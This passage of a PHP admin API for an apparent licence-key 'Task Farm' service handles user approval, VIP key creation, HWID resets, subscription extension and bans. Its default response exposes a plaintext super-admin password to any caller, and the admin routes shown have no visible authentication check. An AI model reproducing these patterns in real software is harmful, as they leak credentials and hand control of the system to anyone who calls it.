            $vipKey = "ATF-$p1-$p2-$p3";
            $keyId = 'key_' . substr(md5(uniqid()), 0, 8);

            $insKey = $pdo->prepare("INSERT INTO license_keys (id, code, duration_days, max_threads, note, status, used_by, used_at) VALUES (?, ?, ?, ?, 'Cấp Trực Tiếp Bởi Admin', 'used', ?, NOW())");
            $insKey->execute([$keyId, $vipKey, $days, $threads, $username]);

            $stmt = $pdo->prepare("
                UPDATE users SET 
                    status = 'active',
                    is_approved = 1,
                    active_key = ?,
                    max_threads = ?,
                    expires_at = DATE_ADD(NOW(), INTERVAL $days DAY)
                WHERE id = ? OR username = ?
            ");
            $stmt->execute([$vipKey, $threads, $userId, $username]);

            jsonResp(['success' => true, 'message' => "🎉 Đã duyệt và cấp Key VIP [$vipKey] ($days ngày) cho [$username]!"]);
        } else {
            $stmt = $pdo->prepare("
                UPDATE users SET 
                    status = 'approved',
                    is_approved = 1,
                    active_key = NULL,
                    expires_at = NULL
                WHERE id = ? OR username = ?
            ");
            $stmt->execute([$userId, $username]);

            jsonResp(['success' => true, 'message' => "🎉 Đã duyệt tài khoản [$username] thành công! Người dùng sẽ được yêu cầu nhập Key VIP để vào hệ thống."]);
        }
    }
}

// 11. Admin: Reject / Delete User
if (($route === '/admin/reject-user' || $route === '/admin/users/delete') && $method === 'POST') {
    $userId = trim($input['userId'] ?? '');
    $username = trim($input['username'] ?? '');

    if ($pdo && (!empty($userId) || !empty($username))) {
        $stmt = $pdo->prepare("DELETE FROM users WHERE id = ? OR username = ?");
        $stmt->execute([$userId, $username]);
    }
    jsonResp(['success' => true, 'message' => "Đã từ chối và xóa tài khoản [$username]!"]);
}

// 12. Admin: Create VIP Key
if (($route === '/admin/create-key' || $route === '/admin/keys/create') && $method === 'POST') {
    $days = max(1, (int)($input['days'] ?? 30));
    $threads = max(1, (int)($input['threads'] ?? 20));
    $note = trim($input['note'] ?? 'Khách Mua');
    $count = min(50, max(1, (int)($input['count'] ?? 1)));

    $created = [];
    if ($pdo) {
        $ins = $pdo->prepare("
            INSERT INTO license_keys (id, code, duration_days, max_threads, note, status)
            VALUES (?, ?, ?, ?, ?, 'unused')
        ");

        for ($i = 0; $i < $count; $i++) {
            $p1 = strtoupper(substr(md5(uniqid(rand(), true)), 0, 4));
            $p2 = strtoupper(substr(md5(uniqid(rand(), true)), 0, 4));
            $p3 = strtoupper(substr(md5(uniqid(rand(), true)), 0, 4));
            $code = "ATF-$p1-$p2-$p3";
            $keyId = 'key_' . substr(md5(uniqid()), 0, 8);

            $ins->execute([$keyId, $code, $days, $threads, $note]);

            $created[] = [
                'code' => $code,
                'days' => $days,
                'threads' => $threads,
                'note' => $note,
                'status' => 'unused'
            ];
        }
    }

    jsonResp([
        'success' => true,
        'message' => "Tạo thành công $count mã Key VIP vào MySQL!",
        'keys' => $created
    ]);
}

// 13. Admin: Delete / Revoke Key
if (strpos($route, '/admin/keys/') !== false || $route === '/admin/delete-key') {
    $keyStr = trim($input['code'] ?? $input['key'] ?? '');
    if (empty($keyStr)) {
        $parts = explode('/admin/keys/', $route);
        if (!empty($parts[1])) $keyStr = trim($parts[1]);
    }

    if ($pdo && !empty($keyStr)) {
        $stmt = $pdo->prepare("DELETE FROM license_keys WHERE code = ?");
        $stmt->execute([$keyStr]);
    }
    jsonResp(['success' => true, 'message' => "Đã xóa mã Key [$keyStr] khỏi hệ thống!"]);
}

// 14. Admin: Reset HWID
if ($route === '/admin/reset-hwid' || strpos($route, 'reset-hwid') !== false) {
    $target = trim($input['username'] ?? $input['userId'] ?? '');
    if (empty($target)) {
        preg_match('#/admin/users/(.*?)/reset-hwid#', $route, $m);
        if (!empty($m[1])) $target = $m[1];
    }
    if ($pdo && !empty($target)) {
        $stmt = $pdo->prepare("UPDATE users SET bound_hwid = NULL WHERE username = ? OR id = ?");
        $stmt->execute([$target, $target]);
    }
    jsonResp(['success' => true, 'message' => "Đã mở khóa thiết bị (Reset HWID) thành công!"]);
}

// 15. Admin: Add Days / Extend VIP
if ($route === '/admin/add-days' || strpos($route, 'extend') !== false) {
    $target = trim($input['username'] ?? $input['userId'] ?? '');
    if (empty($target)) {
        preg_match('#/admin/users/(.*?)/extend#', $route, $m);
        if (!empty($m[1])) $target = $m[1];
    }
    $days = max(1, (int)($input['days'] ?? 30));
    if ($pdo && !empty($target)) {
        $stmt = $pdo->prepare("
            UPDATE users SET expires_at = DATE_ADD(COALESCE(CASE WHEN expires_at > NOW() THEN expires_at ELSE NOW() END, NOW()), INTERVAL $days DAY)
            WHERE username = ? OR id = ?
        ");
        $stmt->execute([$target, $target]);
    }
    jsonResp(['success' => true, 'message' => "Đã gia hạn thêm $days ngày VIP thành công!"]);
}

// 16. Admin: Toggle Ban User
if ($route === '/admin/toggle-ban' || strpos($route, 'toggle-ban') !== false) {
    $target = trim($input['username'] ?? $input['userId'] ?? '');
    if (empty($target)) {
        preg_match('#/admin/users/(.*?)/toggle-ban#', $route, $m);
        if (!empty($m[1])) $target = $m[1];
    }
    if ($pdo && !empty($target)) {
        $stmt = $pdo->prepare("UPDATE users SET is_banned = NOT is_banned WHERE username = ? OR id = ?");
        $stmt->execute([$target, $target]);
    }
    jsonResp(['success' => true, 'message' => "Đã thay đổi trạng thái khóa tài khoản thành công!"]);
}

// Default Fallback
jsonResp([
    'success' => true,
    'message' => 'ATF Task Farm MySQL Cloud API Ready',
    'database' => 'MySQL PDO Connected (ttfquanlisite_atf)',
    'superAdminPassword' => 'phamlinh12',
    'telegramGateway' => 'Live MTProto Connected (Render)',
    'time' => date('Y-m-d H:i:s')
]);
